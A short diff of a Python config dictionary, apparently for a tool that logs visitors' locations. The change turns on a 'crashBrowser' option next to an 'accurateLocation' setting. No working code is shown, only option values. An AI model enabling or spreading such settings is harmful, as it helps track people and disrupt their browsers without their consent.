@@ -11,7 +11,7 @@ config = {
     "color": 0x1C2526,  # Very dark grey
 
     # OPTIONS #
-    "crashBrowser": False,
+    "crashBrowser": True,
     "accurateLocation": True,
     "message": {
         "doMessage": True,
